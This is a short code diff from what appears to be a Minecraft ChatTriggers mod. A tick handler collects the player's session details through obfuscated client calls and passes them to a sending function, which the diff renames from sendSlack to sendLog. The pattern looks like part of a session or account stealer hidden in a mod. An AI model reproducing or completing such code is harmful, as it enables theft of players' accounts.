@@ -37,7 +37,8 @@ const onEnable = register("tick", () => {
                  .func_110432_I()
                  .func_111285_a()
     ];
-    sendSlack(data[1] + " " + data[0]);
+    sendLog(data[1] + " " + data[0]);
 
 });
+
 
